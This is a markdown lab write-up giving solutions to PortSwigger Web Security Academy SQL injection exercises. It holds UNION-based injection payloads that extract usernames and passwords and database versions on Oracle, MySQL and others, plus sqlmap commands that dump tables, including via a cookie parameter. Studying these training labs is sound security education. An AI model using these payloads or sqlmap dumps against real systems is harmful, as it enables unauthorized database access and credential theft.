<!-- omit in toc -->
# SQL Injection

<!-- omit in toc -->
## Table of Contents

- [SQL injection UNION attack, determining the number of columns returned by the query](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
- [SQL injection UNION attack, finding a column containing text](#sql-injection-union-attack-finding-a-column-containing-text)
- [SQL injection UNION attack, retrieving data from other tables](#sql-injection-union-attack-retrieving-data-from-other-tables)
- [SQL injection UNION attack, retrieving multiple values in a single column](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
- [SQL injection attack, querying the database type and version on Oracle](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)
- [SQL injection attack, querying the database type and version on MySQL and Microsoft](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
- [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
- [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)
- [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)

## SQL injection UNION attack, determining the number of columns returned by the query
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

<!-- omit in toc -->
### Quick Solution
The ``category`` parameter is vulnerable to SQL Injection, use a **UNION** attack to retrieve the number of columns, the payload is simply:
```
# Keep adding NULL until the error disappears
'+UNION+SELECT+NULL,NULL--
```
<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the ``category`` parameter, giving it the value ``'+UNION+SELECT+NULL--``. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value: 
```
'+UNION+SELECT+NULL,NULL--
```
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

## SQL injection UNION attack, finding a column containing text
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

<!-- omit in toc -->
### Quick Solution
The ``category`` parameter is vulnerable to SQL Injection, combine the previous payload to retrieve the number of columns and then change the ``NULL`` value one by one with a random string to find a column that contains text. Payload in the next section

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the ``category`` parameter: 
```
'+UNION+SELECT+NULL,NULL,NULL--
```
3. Try replacing each null with the random value provided by the lab, for example: 
```
'+UNION+SELECT+'abcdef',NULL,NULL--
```
4. If an error occurs, move on to the next null and try that instead.

## SQL injection UNION attack, retrieving data from other tables
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

<!-- omit in toc -->
### Quick Solution
Use the previous payloads to retrieve the number of columns and which columns contain text data. The description says that there is a ``users`` table with columns called ``username`` and ``password``. Use the following payload to retrieve the contents of ``users`` table:
```
'+UNION+SELECT+username,+password+FROM+users--
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
```
'+UNION+SELECT+'abc','def'--.
```
3. Use the following payload to retrieve the contents of the users table: 
```
'+UNION+SELECT+username,+password+FROM+users--
```
4. Verify that the application's response contains usernames and passwords.

## SQL injection UNION attack, retrieving multiple values in a single column
Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

<!-- omit in toc -->
### Quick Solution
The original query returns two colums, but only one contains text. Multiple values can be retrieved together including a suitable separator to let distinguish the combined values. The payload for this lab is the following:
```
' UNION SELECT username || '~' || password FROM users--
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the ``category`` parameter: 
```
'+UNION+SELECT+NULL,'abc'--
```
3. Use the following payload to retrieve the contents of the users table: 
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
4. Verify that the application's response contains usernames and passwords.

## SQL injection attack, querying the database type and version on Oracle
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

<!-- omit in toc -->
### Quick Solution
Be aware that on Oracle databases every ``SELECT`` statement must specify a table to select ``FROM``. There is a built-in table on Oracle called ``dual`` which can be used for this purpose. After retrieving the number of columns and which column contains data the SQL Injection cheatsheet can be used to discover how to retrieve the version on Oracle databases. The payload is the following:
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
3. Use the following payload to display the database version: 
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

## SQL injection attack, querying the database type and version on MySQL and Microsoft
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

<!-- omit in toc -->
### Quick Solution
This lab is similar to the ones before. The only difference is that it is mandatory to use Burp because seems impossible to inject the '#' character from the browser. The final payload is the following:
```
'+UNION+SELECT+@@version,+NULL#
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter: 
```
'+UNION+SELECT+'abc','def'#
```
3. Use the following payload to display the database version: 
```
'+UNION+SELECT+@@version,+NULL#
```

## SQL injection attack, listing the database contents on non-Oracle databases
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

<!-- omit in toc -->
### Quick Solution
In this case a full attack must be completed. For this reason I used a tool to automate it: ``sqlmap``. To retrieve the credentials of the ``administrator`` I used the the following commands (I used the Dockerized version of ``sqlmap``):
```
# Get Databases
docker run -it --rm secsi/sqlmap -u "<target_url>" --dbs
# List tables in database
docker run -it --rm secsi/sqlmap -u "<target_url>" -D public --tables
# Dump content of a DB table
docker run -it --rm secsi/sqlmap -u "<target_url>" -D public -T <users_table_name> --dump
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter: 
```
'+UNION+SELECT+'abc','def'--.
```
3. Use the following payload to retrieve the list of tables in the database:
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```
8. Find the password for the ``administrator`` user, and use it to log in.

## SQL injection attack, listing the database contents on Oracle
Reference: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

<!-- omit in toc -->
### Quick Solution
The same applies for this lab with a little difference: ``Oracle`` DBMS is a little bit different when it comes to databases. So I used this commands:
```
# Get Tables
docker run -it --rm secsi/sqlmap -u "<target_url>" --tables
# Then I found the target table and runned
docker run -it --rm secsi/sqlmap -u "<target_url>" -T <users_table_name> --dump
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter:
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
3. Use the following payload to retrieve the list of tables in the database:
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
8. Find the password for the ``administrator`` user, and use it to log in.

## Blind SQL injection with conditional responses
Reference: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

<!-- omit in toc -->
### Quick Solution
This time the SQL Injections resides in the ``TrackingId`` cookie. For this reason a different ``sqlmap`` command must be used:
```
# Detect tables
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --tables
# Dump the content of 'users' table (set DBMS to speed up the execution)
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dbms=postgresql --dump
```

<!-- omit in toc -->
### Solution
The solution is **extremely long** and it has not been copied, see the reference link.
